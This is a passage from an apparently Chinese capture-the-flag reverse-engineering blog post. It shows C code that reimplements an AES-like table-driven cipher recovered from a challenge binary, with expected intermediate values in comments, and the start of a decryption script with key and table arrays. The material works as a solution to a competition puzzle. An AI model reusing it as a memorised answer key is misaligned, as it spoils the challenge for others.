<span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>, <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>,</span><br><span class="line">  <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>,</span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0xCB</span>, <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>, <span class="number">0x08</span>, <span class="number">0x2E</span>,</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>, <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>,</span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>, <span class="number">0x3A</span>, <span class="number">0x91</span>,</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>,</span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>, <span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>,</span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xF4</span>, <span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>, <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE1</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE2</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BYTE <span class="title">HIBYTE</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE0</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> _data &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD _enc_flag[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD *flag = (DWORD *)_flag;</span><br><span class="line"><span class="keyword">int</span> key_index = <span class="number">0</span>;</span><br><span class="line">DWORD v9 = <span class="number">0</span>, v8 = <span class="number">0</span>, v7 = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">DWORD v11 = <span class="number">0</span>, v13 = <span class="number">0</span>, v15 = <span class="number">0</span>, v17 = <span class="number">0</span>;</span><br><span class="line">DWORD v12 = <span class="number">0</span>, v14 = <span class="number">0</span>, v16 = <span class="number">0</span>, v18 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">v9 = flag[<span class="number">3</span>] ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">v8 = flag[<span class="number">2</span>] ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">v7 = flag[<span class="number">1</span>] ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">i = flag[<span class="number">0</span>] ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">13</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = dword_405420[<span class="built_in">BYTE1</span>(v9)] ^ dword_405820[<span class="built_in">BYTE2</span>(v8)] ^ dword_405C20[<span class="built_in">HIBYTE</span>(v7)] ^ dword_405020[<span class="built_in">BYTE0</span>(i)];</span><br><span class="line">v13 = dword_405420[<span class="built_in">BYTE1</span>(i)] ^ dword_405820[<span class="built_in">BYTE2</span>(v9)] ^ dword_405C20[<span class="built_in">HIBYTE</span>(v8)] ^ dword_405020[<span class="built_in">BYTE0</span>(v7)];</span><br><span class="line">v15 = dword_405420[<span class="built_in">BYTE1</span>(v7)] ^ dword_405820[<span class="built_in">BYTE2</span>(i)] ^ dword_405C20[<span class="built_in">HIBYTE</span>(v9)] ^ dword_405020[<span class="built_in">BYTE0</span>(v8)];</span><br><span class="line">v17 = dword_405420[<span class="built_in">BYTE1</span>(v8)] ^ dword_405820[<span class="built_in">BYTE2</span>(v7)] ^ dword_405C20[<span class="built_in">HIBYTE</span>(i)] ^ dword_405020[<span class="built_in">BYTE0</span>(v9)];</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一轮时 V11, V13, V15, V17的值应该如下</span></span><br><span class="line"><span class="comment">// v11 = 0xf048c314;</span></span><br><span class="line"><span class="comment">// v13 = 0xb4db6016;</span></span><br><span class="line"><span class="comment">// v15 = 0x8eee5336;</span></span><br><span class="line"><span class="comment">// v17 = 0x948726e2;</span></span><br><span class="line"></span><br><span class="line">v9 = v17 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">v8 = v15 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">v7 = v13 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">i = v11 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行到这里，v9, v8, v7, i的数据应该如下</span></span><br><span class="line"><span class="comment">// v9 = 0x948726e2;</span></span><br><span class="line"><span class="comment">// v8 = 0x51f188a1;</span></span><br><span class="line"><span class="comment">// v7 = 0x9b05b51d;</span></span><br><span class="line"><span class="comment">// i = 0xb9f8810c;</span></span><br><span class="line"></span><br><span class="line">v12 = (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE1</span>(v9)] &lt;&lt; <span class="number">8</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE2</span>(v8)] &lt;&lt; <span class="number">16</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">HIBYTE</span>(v7)] &lt;&lt; <span class="number">24</span>) | RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE0</span>(i)];</span><br><span class="line">v14 = (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE1</span>(i)] &lt;&lt; <span class="number">8</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE2</span>(v9)] &lt;&lt; <span class="number">16</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">HIBYTE</span>(v8)] &lt;&lt; <span class="number">24</span>) | RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE0</span>(v7)];</span><br><span class="line">v16 = (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE1</span>(v7)] &lt;&lt; <span class="number">8</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE2</span>(i)] &lt;&lt; <span class="number">16</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">HIBYTE</span>(v9)] &lt;&lt; <span class="number">24</span>) | RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE0</span>(v8)];</span><br><span class="line">v18 = (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE1</span>(v8)] &lt;&lt; <span class="number">8</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE2</span>(v7)] &lt;&lt; <span class="number">16</span>) | (RijnDael_AES_LONG_inv_406120[<span class="built_in">HIBYTE</span>(i)] &lt;&lt; <span class="number">24</span>) | RijnDael_AES_LONG_inv_406120[<span class="built_in">BYTE0</span>(v9)];</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行到这里，v12, v14, v16, v18的数据应该如下</span></span><br><span class="line"><span class="comment">// 0xe82b2381 v12</span></span><br><span class="line"><span class="comment">// 0x70ea91de v14</span></span><br><span class="line"><span class="comment">// 0xe7e1d2f1 v16</span></span><br><span class="line"><span class="comment">// 0xdb36973b v18</span></span><br><span class="line"></span><br><span class="line">_enc_flag[<span class="number">3</span>] = v18 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">_enc_flag[<span class="number">2</span>] = v16 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">_enc_flag[<span class="number">1</span>] = v14 ^ key[key_index];</span><br><span class="line">key_index += <span class="number">1</span>;</span><br><span class="line">_enc_flag[<span class="number">0</span>] = v12 ^ key[key_index];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%#X, &quot;</span>, _enc_flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写解密脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">DWORD key[<span class="number">60</span>] = &#123; <span class="number">0xc3bb95b</span>, <span class="number">0x578c9d63</span>, <span class="number">0x7faca21c</span>, <span class="number">0x29522e93</span>, <span class="number">0xb268681</span>, <span class="number">0xda705e01</span>, <span class="number">0xa7732a53</span>, <span class="number">0x72e0c013</span>, <span class="number">0x4b4fcf3b</span>, <span class="number">0xe46963a6</span>, <span class="number">0x3eeea9d2</span>, <span class="number">0xefb38fbb</span>, <span class="number">0xd156d880</span>, <span class="number">0x7d037452</span>, <span class="number">0xd593ea40</span>, <span class="number">0xd5223126</span>, <span class="number">0xaf26ac9d</span>, <span class="number">0xda87ca74</span>, <span class="number">0xd15d2669</span>, <span class="number">0x6cadaad</span>, <span class="number">0xac55acd2</span>, <span class="number">0xa8909e12</span>, <span class="number">0xb1db66</span>, <span class="number">0xcc4c1870</span>, <span class="number">0x75a166e9</span>, <span class="number">0xbdaec1d</span>, <span class="number">0xd797fcc4</span>, <span class="number">0x9cd3659b</span>, <span class="number">0x4c532c0</span>, <span class="number">0xa8214574</span>, <span class="number">0xccfdc316</span>, <span class="number">0x6019b4a2</span>, <span class="number">0x7e7b8af4</span>, <span class="number">0xdc4d10d9</span>, <span class="number">0x4b44995f</span>, <span class="number">0x2ca5c858</span>, <span class="number">0xace477b4</span>, <span class="number">0x64dc8662</span>, <span class="number">0xace477b4</span>, <span class="number">0xbbc35df5</span>, <span class="number">0xa2369a2d</span>, <span class="number">0x97098986</span>, <span class="number">0x67e15107</span>, <span class="number">0xfd0b6e21</span>, <span class="number">0xc838f1d6</span>, <span class="number">0xc838f1d6</span>, <span class="number">0x17272a41</span>, <span class="number">0x38f9ff4a</span>, <span class="number">0x353f13ab</span>, <span class="number">0xf0e8d881</span>, <span class="number">0x9aea3f26</span>, <span class="number">0x5f3df40c</span>, <span class="number">0x0</span>, <span class="number">0xdf1fdb97</span>, <span class="number">0x2fded50b</span>, <span class="number">0x49b04218</span>, <span class="number">0xf3000000</span>, <span class="number">0xc3fa1e0f</span>, <span class="number">0xf3000000</span>, <span class="number">0x841f</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405420[<span class="number">256</span>] = &#123; <span class="number">0xa7f45150</span>, <span class="number">0x65417e53</span>, <span class="number">0xa4171ac3</span>, <span class="number">0x5e273a96</span>, <span class="number">0x6bab3bcb</span>, <span class="number">0x459d1ff1</span>, <span class="number">0x58faacab</span>, <span class="number">0x3e34b93</span>, <span class="number">0xfa302055</span>, <span class="number">0x6d76adf6</span>, <span class="number">0x76cc8891</span>, <span class="number">0x4c02f525</span>, <span class="number">0xd7e54ffc</span>, <span class="number">0xcb2ac5d7</span>, <span class="number">0x44352680</span>, <span class="number">0xa362b58f</span>, <span class="number">0x5ab1de49</span>, <span class="number">0x1bba2567</span>, <span class="number">0xeea4598</span>, <span class="number">0xc0fe5de1</span>, <span class="number">0x752fc302</span>, <span class="number">0xf04c8112</span>, <span class="number">0x97468da3</span>, <span class="number">0xf9d36bc6</span>, <span class="number">0x5f8f03e7</span>, <span class="number">0x9c921595</span>, <span class="number">0x7a6dbfeb</span>, <span class="number">0x595295da</span>, <span class="number">0x83bed42d</span>, <span class="number">0x217458d3</span>, <span class="number">0x69e04929</span>, <span class="number">0xc8c98e44</span>, <span class="number">0x89c2756a</span>, <span class="number">0x798ef478</span>, <span class="number">0x3e58996b</span>, <span class="number">0x71b927dd</span>, <span class="number">0x4fe1beb6</span>, <span class="number">0xad88f017</span>, <span class="number">0xac20c966</span>, <span class="number">0x3ace7db4</span>, <span class="number">0x4adf6318</span>, <span class="number">0x311ae582</span>, <span class="number">0x33519760</span>, <span class="number">0x7f536245</span>, <span class="number">0x7764b1e0</span>, <span class="number">0xae6bbb84</span>, <span class="number">0xa081fe1c</span>, <span class="number">0x2b08f994</span>, <span class="number">0x68487058</span>, <span class="number">0xfd458f19</span>, <span class="number">0x6cde9487</span>, <span class="number">0xf87b52b7</span>, <span class="number">0xd373ab23</span>, <span class="number">0x24b72e2</span>, <span class="number">0x8f1fe357</span>, <span class="number">0xab55662a</span>, <span class="number">0x28ebb207</span>, <span class="number">0xc2b52f03</span>, <span class="number">0x7bc5869a</span>, <span class="number">0x837d3a5</span>, <span class="number">0x872830f2</span>, <span class="number">0xa5bf23b2</span>, <span class="number">0x6a0302ba</span>, <span class="number">0x8216ed5c</span>, <span class="number">0x1ccf8a2b</span>, <span class="number">0xb479a792</span>, <span class="number">0xf207f3f0</span>, <span class="number">0xe2694ea1</span>, <span class="number">0xf4da65cd</span>, <span class="number">0xbe0506d5</span>, <span class="number">0x6234d11f</span>, <span class="number">0xfea6c48a</span>, <span class="number">0x532e349d</span>, <span class="number">0x55f3a2a0</span>, <span class="number">0xe18a0532</span>, <span class="number">0xebf6a475</span>, <span class="number">0xec830b39</span>, <span class="number">0xef6040aa</span>, <span class="number">0x9f715e06</span>, <span class="number">0x106ebd51</span>, <span class="number">0x8a213ef9</span>, <span class="number">0x6dd963d</span>, <span class="number">0x53eddae</span>, <span class="number">0xbde64d46</span>, <span class="number">0x8d5491b5</span>, <span class="number">0x5dc47105</span>, <span class="number">0xd406046f</span>, <span class="number">0x155060ff</span>, <span class="number">0xfb981924</span>, <span class="number">0xe9bdd697</span>, <span class="number">0x434089cc</span>, <span class="number">0x9ed96777</span>, <span class="number">0x42e8b0bd</span>, <span class="number">0x8b890788</span>, <span class="number">0x5b19e738</span>, <span class="number">0xeec879db</span>, <span class="number">0xa7ca147</span>, <span class="number">0xf427ce9</span>, <span class="number">0x1e84f8c9</span>, <span class="number">0x0</span>, <span class="number">0x86800983</span>, <span class="number">0xed2b3248</span>, <span class="number">0x70111eac</span>, <span class="number">0x725a6c4e</span>, <span class="number">0xff0efdfb</span>, <span class="number">0x38850f56</span>, <span class="number">0xd5ae3d1e</span>, <span class="number">0x392d3627</span>, <span class="number">0xd90f0a64</span>, <span class="number">0xa65c6821</span>, <span class="number">0x545b9bd1</span>, <span class="number">0x2e36243a</span>, <span class="number">0x670a0cb1</span>, <span class="number">0xe757930f</span>, <span class="number">0x96eeb4d2</span>, <span class="number">0x919b1b9e</span>, <span class="number">0xc5c0804f</span>, <span class="number">0x20dc61a2</span>, <span class="number">0x4b775a69</span>, <span class="number">0x1a121c16</span>, <span class="number">0xba93e20a</span>, <span class="number">0x2aa0c0e5</span>, <span class="number">0xe0223c43</span>, <span class="number">0x171b121d</span>, <span class="number">0xd090e0b</span>, <span class="number">0xc78bf2ad</span>, <span class="number">0xa8b62db9</span>, <span class="number">0xa91e14c8</span>, <span class="number">0x19f15785</span>, <span class="number">0x775af4c</span>, <span class="number">0xdd99eebb</span>, <span class="number">0x607fa3fd</span>, <span class="number">0x2601f79f</span>, <span class="number">0xf5725cbc</span>, <span class="number">0x3b6644c5</span>, <span class="number">0x7efb5b34</span>, <span class="number">0x29438b76</span>, <span class="number">0xc623cbdc</span>, <span class="number">0xfcedb668</span>, <span class="number">0xf1e4b863</span>, <span class="number">0xdc31d7ca</span>, <span class="number">0x85634210</span>, <span class="number">0x22971340</span>, <span class="number">0x11c68420</span>, <span class="number">0x244a857d</span>, <span class="number">0x3dbbd2f8</span>, <span class="number">0x32f9ae11</span>, <span class="number">0xa129c76d</span>, <span class="number">0x2f9e1d4b</span>, <span class="number">0x30b2dcf3</span>, <span class="number">0x52860dec</span>, <span class="number">0xe3c177d0</span>, <span class="number">0x16b32b6c</span>, <span class="number">0xb970a999</span>, <span class="number">0x489411fa</span>, <span class="number">0x64e94722</span>, <span class="number">0x8cfca8c4</span>, <span class="number">0x3ff0a01a</span>, <span class="number">0x2c7d56d8</span>, <span class="number">0x903322ef</span>, <span class="number">0x4e4987c7</span>, <span class="number">0xd138d9c1</span>, <span class="number">0xa2ca8cfe</span>, <span class="number">0xbd49836</span>, <span class="number">0x81f5a6cf</span>, <span class="number">0xde7aa528</span>, <span class="number">0x8eb7da26</span>, <span class="number">0xbfad3fa4</span>, <span class="number">0x9d3a2ce4</span>, <span class="number">0x9278500d</span>, <span class="number">0xcc5f6a9b</span>, <span class="number">0x467e5462</span>, <span class="number">0x138df6c2</span>, <span class="number">0xb8d890e8</span>, <span class="number">0xf7392e5e</span>, <span class="number">0xafc382f5</span>, <span class="number">0x805d9fbe</span>, <span class="number">0x93d0697c</span>, <span class="number">0x2dd56fa9</span>, <span class="number">0x1225cfb3</span>, <span class="number">0x99acc83b</span>, <span class="number">0x7d1810a7</span>, <span class="number">0x639ce86e</span>, <span class="number">0xbb3bdb7b</span>, <span class="number">0x7826cd09</span>, <span class="number">0x18596ef4</span>, <span class="number">0xb79aec01</span>, <span class="number">0x9a4f83a8</span>, <span class="number">0x6e95e665</span>, <span class="number">0xe6ffaa7e</span>, <span class="number">0xcfbc2108</span>, <span class="number">0xe815efe6</span>, <span class="number">0x9be7bad9</span>, <span class="number">0x366f4ace</span>, <span class="number">0x99fead4</span>, <span class="number">0x7cb029d6</span>, <span class="number">0xb2a431af</span>, <span class="number">0x233f2a31</span>, <span class="number">0x94a5c630</span>, <span class="number">0x66a235c0</span>, <span class="number">0xbc4e7437</span>, <span class="number">0xca82fca6</span>, <span class="number">0xd090e0b0</span>, <span class="number">0xd8a73315</span>, <span class="number">0x9804f14a</span>, <span class="number">0xdaec41f7</span>, <span 